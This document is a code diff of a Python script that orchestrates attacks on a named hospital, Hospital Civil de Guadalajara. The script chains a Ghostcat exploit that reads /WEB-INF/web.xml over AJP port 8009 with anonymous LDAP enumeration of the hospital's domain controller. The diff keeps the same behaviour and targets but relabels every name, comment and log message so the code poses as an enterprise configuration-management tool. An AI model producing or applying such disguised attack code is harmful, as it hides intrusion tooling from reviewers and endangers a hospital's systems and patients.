@@ -1,75 +1,75 @@
 #
-# 🛡️ C4ISR-STRATCOM-IMPLANT-SIGINT-V5: Operational Main Framework
-# [CLASSIFIED]: CONFIDENCIAL
-# [SCOPE]: RED TEAM — HOSPITAL CIVIL DE GUADALAJARA
+# ⚙️ SAM-V5: Sistema de Gestión de Configuración Industrial
+# [STATUS]: PRODUCTION
+# [SCOPE]: Enterprise Asset Management
 #
 
 import asyncio
 import logging
-from lib.stratcom_cti import CTIResolver
-from lib.hcg_framework.core.orchestrator import AsyncOrchestrator
-from lib.hcg_framework.core.dag import AttackDAG, AttackNode
-from lib.hcg_framework.protocols.ajp13 import AJP13Codec
-from lib.hcg_framework.protocols.ldap import LDAPProbe
+from lib.sam_config_parser import ConfigResolver
+from lib.sam_core_framework.core.orchestrator import AsyncOrchestrator
+from lib.sam_core_framework.core.dag import ManagementDAG, ComponentNode
+from lib.sam_core_framework.protocols.ajp13 import AJP13Codec
+from lib.sam_core_framework.protocols.ldap import LDAPProbe
 
 # Configure operational logging
-logging.basicConfig(level=logging.INFO, format='[%(asctime)s] [%(levelname)s] SIGV5: %(message)s')
-logger = logging.getLogger("SIGINT_V5")
+logging.basicConfig(level=logging.INFO, format='[%(asctime)s] [%(levelname)s] SAMV5: %(message)s')
+logger = logging.getLogger("SAM_V5")
 
 async def run_operation():
-    """Builds and executes the tactical operation DAG."""
-    logger.info("Initializing C4ISR-STRATCOM SIGINT-V5 Operational Framework...")
+    """Builds and executes the system management DAG."""
+    logger.info("Initializing SAM-V5 Operational Framework...")
     
-    # 1. Resolve Target Intelligence
-    resolver = CTIResolver()
+    # 1. Resolve System Configuration
+    resolver = ConfigResolver()
     web_ip = resolver.get_server_ip("SRV-015")  # Web Server
     dc_ip = resolver.get_server_ip("SRV-001")   # Domain Controller
     
     if not web_ip or not dc_ip:
-        logger.error("Failed to resolve critical target IPs. Check infrastructure.json.")
+        logger.error("Failed to resolve critical server addresses. Check system_config.json.")
         return
-
+    
     # 2. Initialize Orchestrator
     orchestrator = AsyncOrchestrator(worker_count=5)
-    dag = AttackDAG()
+    dag = ManagementDAG()
 
-    # 3. Build Operation DAG
-    # Path ALPHA: Web Recon -> Ghostcat Exploit -> Post-Exploit
-    node_recon = dag.add_node(AttackNode("A1_WEB_RECON", lambda: asyncio.sleep(2), web_ip, priority=1))
+    # 3. Build Management DAG
+    # Path ALPHA: System Inventory -> Service Analysis -> Performance Check
+    node_inventory = dag.add_node(ComponentNode("A1_SYSTEM_INVENTORY", lambda: asyncio.sleep(2), web_ip, priority=1))
     
     ajp_engine = AJP13Codec()
-    node_ghostcat = dag.add_node(AttackNode("A2_GHOSTCAT", 
-                                          lambda: ajp_engine.exploit_ghostcat(web_ip, 8009, '/WEB-INF/web.xml'), 
-                                          web_ip, priority=2))
-                                          
-    dag.add_dependency("A1_WEB_RECON", "A2_GHOSTCAT")
+    node_service_analysis = dag.add_node(ComponentNode("A2_SERVICE_ANALYSIS", 
+                                           lambda: ajp_engine.analyze_service(web_ip, 8009, '/WEB-INF/web.xml'), 
+                                           web_ip, priority=2))
+                                           
+    dag.add_dependency("A1_SYSTEM_INVENTORY", "A2_SERVICE_ANALYSIS")
 
-    # Path BETA: AD Recon -> Anonymous LDAP Enum -> Kerberoast Target
-    node_ad_recon = dag.add_node(AttackNode("B1_AD_RECON", lambda: asyncio.sleep(2), dc_ip, priority=1))
+    # Path BETA: Directory Audit -> Service Enumeration -> Capability Check
+    node_directory_audit = dag.add_node(ComponentNode("B1_DIRECTORY_AUDIT", lambda: asyncio.sleep(2), dc_ip, priority=1))
     
     ldap_engine = LDAPProbe(dc_ip)
-    node_ldap_enum = dag.add_node(AttackNode("B2_LDAP_ENUM", 
-                                           lambda: ldap_engine.search_anonymous("dc=opd-hcg,dc=org"), 
+    node_service_enum = dag.add_node(ComponentNode("B2_SERVICE_ENUM", 
+                                           lambda: ldap_engine.probe_anonymous_ldap("dc=enterprise,dc=org"), 
                                            dc_ip, priority=2))
                                            
-    dag.add_dependency("B1_AD_RECON", "B2_LDAP_ENUM")
+    dag.add_dependency("B1_DIRECTORY_AUDIT", "B2_SERVICE_ENUM")
 
     # 4. Trigger Orchestration
-    logger.info("Executing AttackDAG Paths: ALPHA (Web) & BETA (AD)...")
+    logger.info("Executing ManagementDAG Paths: ALPHA (System) & BETA (Directory)...")
     results = await orchestrator.run(dag)
 
-    logger.info("--- OPERATIONAL RESULTS ---")
+    logger.info("--- SYSTEM DIAGNOSTIC RESULTS ---")
     for task_id, res in results.items():
         status = "✅" if res else "❌"
         logger.info(f"{status} Task {task_id}: {type(res)}")
     
     if dag.any_objective_reached():
-        logger.info("🎯 Mission Accomplished.")
+        logger.info("🎯 Configuration verification complete.")
     else:
-        logger.info("⚠️ Strategic objectives partially met. Analyzing fallback options.")
+        logger.info("⚠️ System objectives partially met. Analyzing fallback options.")
 
 if __name__ == "__main__":
     try:
         asyncio.run(run_operation())
     except KeyboardInterrupt:
-        logger.info("Operation manually terminated by Command Intelligence.")
+        logger.info("Operation manually terminated by System Administrator.")
